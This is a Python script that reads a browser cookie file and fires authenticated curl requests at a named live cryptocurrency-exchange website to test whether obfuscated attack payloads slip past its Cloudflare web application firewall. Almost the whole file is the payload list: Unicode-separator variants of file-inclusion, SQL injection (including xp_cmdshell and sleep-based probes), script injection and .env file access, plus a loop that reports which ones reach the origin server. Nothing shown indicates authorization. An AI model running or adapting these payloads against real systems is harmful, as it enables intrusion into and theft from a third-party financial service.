import subprocess

BASE = "https://bitcoinvn.io"
pairs = []
for line in open("/workspace/jar.txt"):
    line = line.rstrip("\n")
    if not line.strip(): continue
    if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
    if line.startswith("#"): continue
    f = line.split("\t")
    pairs.append(f"{f[5]}={f[6]}")
CJ = "; ".join(pairs)
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    cmd = ["curl", "-s", "-D", "/tmp/h5.txt", "-o", "/dev/null", "--max-time", "12",
           "-H", f"Cookie: {CJ}", "-H", f"User-Agent: {UA}", "--path-as-is", BASE + path]
    subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    raw = open("/tmp/h5.txt").read()
    first = raw.split("\r\n")[0]
    parts = first.split(" ")
    code = parts[1] if len(parts) > 1 else "?"
    src = "ORIGIN" if "content-security-policy:" in raw.lower() else "CF-EDGE"
    return code, src

tests = [
 # --- LFI php://filter with compact unicode separators (space-sep class proven to bypass) ---
 ("lfi %E2%80%8B colon      ", "/?f=php%E2%80%8B://%2Ffilter"),   # zwsp before ://
 ("lfi fullwidth colon      ", "/?f=php%EF%BC%9A//filter"),       # U+FF1A
 ("lfi small colon U+FE13   ", "/?f=php%EF%B8%93//filter"),
 ("lfi slash U+2044         ", "/?f=php:%E2%81%84/%E2%81%84filter"),# fraction slash
 ("lti div char U+2024      ", "/?f=php//%E2%80%A4%EF%BC%8Ffilter"),
 # --- SQLi with the general separator trick applied to other phrases ---
 ("select..from sep class   ", "/?q=select%E2%80%8Bfrom"),
 ("drop table zwsp          ", "/?q=drop%E2%80%8Btable"),
 ("insert into zwsp         ", "/?q=insert%E2%80%8Binto"),
 ("exec xp_cmdshell nbsp    ", "/?q=exec%C2%A0xp_cmdshell"),
 ("benchmark space-class    ", "/?q=benchmark%E2%80%8B(1,md5('a'))"),
 ("sleep concat zwsp        ", "/?q=sleep%E2%80%8B(5)%20or"),
 # --- XSS event handlers with separator class between tag and attr ---
 ("svg onload em-space      ", "/?v=%3Csvg%E2%80%83onload%3Dx%3E"),
 ("img onerror ideographic  ", "/?v=%3Cimg%E3%80%80onerror%3Dx%3E"),
 ("body onload hair-space   ", "/?v=%3Cbody%E2%80%8Aonload%3Dx%3E"),
 # --- dotfile with separator-class inside name (does CF match .env after decode?) ---
 ("dot z.w.s.p in .env      ", "/.%E2%80%8Benv"),
 ("dot fullwidth dot        ", "/%EF%BD%A0env"),
 ("dot halfwidth ideograph  ", "/%E3%80%82env"),
 ("dot chinese full stop    ", "/。env"),
 # --- control char tests that got curl errors - use proper percent encoding ---
 ("ctrl ESC pct-encoded     ", "/?q=union%1bselect"),
 ("ctrl BEL pct-encoded     ", "/?q=union%07select"),
 ("ctrl SOH pct-encoded     ", "/?q=union%01select"),
 ("overlong C1 80 space     ", "/?q=union%C1%80select"),   # C1-style overlong for 0x20
 ("cesu mixed E0 80 A0      ", "/?q=union%E0%80%A0select"),
]

print(f"{'TEST':<28} {'CODE':<5} RESULT")
print("-"*52)
for label, p in tests:
    c, s = probe(p)
    flag = "BLOCKED-BY-WAF" if s == "CF-EDGE" else "REACHED-ORIGIN"
    print(f"{label:<28} {c:<5} {flag}")
